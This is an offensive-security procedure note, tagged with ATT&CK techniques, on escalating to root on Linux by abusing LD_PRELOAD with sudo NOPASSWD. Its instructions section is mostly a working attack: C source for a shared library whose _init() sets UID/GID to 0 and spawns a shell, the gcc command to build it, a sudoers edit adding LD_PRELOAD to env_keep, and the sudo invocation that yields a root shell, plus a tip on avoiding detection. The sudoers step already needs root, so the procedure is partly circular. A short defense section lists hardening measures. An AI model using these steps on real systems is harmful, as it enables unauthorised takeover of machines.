---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
  - '[[techniques/Hijack Execution Flow|T1574 - Hijack Execution Flow]]'
sub_techniques:
  - '[[sub-techniques/Sudo and Sudo Caching|T1548.003 - Sudo and Sudo Caching]]'
  - >-
    [[sub-techniques/Dynamic Linker Hijacking|T1574.006 - Dynamic Linker
    Hijacking]]
tags:
  - '[[tags/LD_PRELOAD and NOPASSWD]]'
  - '[[tags/Linux - Privilege Escalation]]'
  - '[[tags/SUDO]]'
commands:
  - '[[commands/add-ld_preload-to-env_keep-in-sudoers]]'
  - '[[commands/compile-ld_preload-shell-with-gcc]]'
  - '[[commands/export-ld_preload-path]]'
platforms:
  - Linux
tools: []
validated: true
---

# linux-privilege-escalation-via-ld_preload-and-nopasswd

## Summary

This procedure demonstrates privilege escalation on Linux systems by abusing the LD_PRELOAD environment variable in conjunction with SUDO's NOPASSWD feature. An attacker compiles a malicious shared library that spawns a root shell upon loading and uses it to hijack a privileged process executed via sudo without a password prompt.

## Description

LD_PRELOAD allows preloading a custom shared object (.so) file before other libraries when running a program, enabling function overriding or injection of custom code. When combined with sudo's NOPASSWD directive—which permits passwordless execution of specific commands—and ensuring LD_PRELOAD is preserved in the sudo environment (via env_keep in sudoers), an attacker can inject code into a setuid binary or sudo-allowed command to gain root privileges. This technique targets misconfigurations in sudoers where users have NOPASSWD access to commands like 'find' or other binaries, allowing the injected library's initializer (_init()) to execute arbitrary code, such as spawning a root shell. It is effective on Linux systems with gcc for compilation and requires low-privilege user access with sudo NOPASSWD rights. Success results in a root shell for further post-exploitation, data access, or persistence.

## Requirements

1. Low-privilege shell access on a Linux target system.
2. Sudo access with NOPASSWD for at least one command (e.g., 'find', 'less').
3. GCC compiler installed on the target (common on most distributions).
4. Write access to a temporary directory like /tmp for storing the .so file.
5. Knowledge of an allowed sudo command that can be hijacked.

## Defense

- Regularly audit /etc/sudoers for NOPASSWD entries and restrict them to minimal commands; avoid broad allowances like ALL.
- Configure sudo to reset or filter dangerous environment variables (e.g., ensure LD_PRELOAD is not in env_keep; use 'env_reset' and explicitly manage env_keep).
- Monitor for suspicious .so compilations (e.g., via auditd rules on gcc executions) and unusual LD_PRELOAD settings in process environments.
- Implement application whitelisting (e.g., AppArmor, SELinux) to prevent loading of untrusted shared libraries.
- Log and alert on privilege escalations, including sudo usage and environment variable anomalies.

## Objectives

1. Compile a malicious shared library to inject root shell execution.
2. Preserve LD_PRELOAD in the sudo environment to enable hijacking.
3. Execute a sudo-allowed command with LD_PRELOAD set to spawn a root shell.
4. Achieve persistent root access for further exploitation.

## Instructions

### Step 1: Create the Malicious Shared Library Source

**Context**: Write a C source file containing the _init() function, which will run automatically when the library is loaded. This function unsets LD_PRELOAD to avoid recursion, sets UID/GID to root, and spawns a shell. Save this as shell.c in /tmp.

**Code** ([[codes/linux-ld_preload-root-shell-library]]):

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

/*
This program sets the GID and UID to 0 (root) and executes a shell.
*/
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

> This code injects a root shell via the library's initializer. Ensure the file is created securely in a writable directory like /tmp to avoid detection.

### Step 2: Compile the Shared Library

**Context**: Use GCC to compile shell.c into a position-independent shared object (shell.so). The -fPIC flag ensures compatibility, -shared creates the .so, and -nostartfiles avoids standard startup linkages that could interfere.

**Command** ([[commands/compile-ld_preload-shell-with-gcc]]):

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
```

> Successful compilation produces /tmp/shell.so without errors. Verify with 'ls -l /tmp/shell.so' to confirm the file exists and has execute permissions if needed.

### Step 3: Ensure LD_PRELOAD Preservation in Sudo

**Context**: Edit /etc/sudoers to add LD_PRELOAD to env_keep, allowing the variable to persist when running sudo commands. This step is necessary if the default sudo configuration resets it. Use visudo for safe editing.

**Command** ([[commands/add-ld_preload-to-env_keep-in-sudoers]]):

```bash
echo "Defaults env_keep += \"LD_PRELOAD\"" | sudo tee -a /etc/sudoers
```

> After execution, verify by running 'sudo -l' to see if LD_PRELOAD is listed in preserved variables. If sudoers editing is restricted, this may require prior access; otherwise, the technique assumes it's configurable or already preserved.

### Step 4: Set the LD_PRELOAD Environment Variable

**Context**: Export LD_PRELOAD to point to the malicious .so file. This loads the library before running the target program.

**Command** ([[commands/export-ld_preload-path]]):

```bash
export LD_PRELOAD=/tmp/shell.so
```

> The variable is now set for the current session. Confirm with 'echo $LD_PRELOAD' showing the path. Unset later with 'unset LD_PRELOAD' if needed.

### Step 5: Execute Hijacked Sudo Command

**Context**: Run a sudo-allowed command (e.g., 'find') with LD_PRELOAD set. The library's _init() will execute first, spawning the root shell before the command runs.

**Command** (custom invocation based on export):

```bash
sudo find /dev/null
```

> Upon execution, a root shell (# prompt) should spawn immediately, interrupting the find command. From the shell, verify privileges with 'id' (should show uid=0(root)). Exit the shell to resume normal operation if desired.

**Expected Output**: A root shell prompt ('#') indicating successful privilege escalation. Commands like 'whoami' will return 'root'.
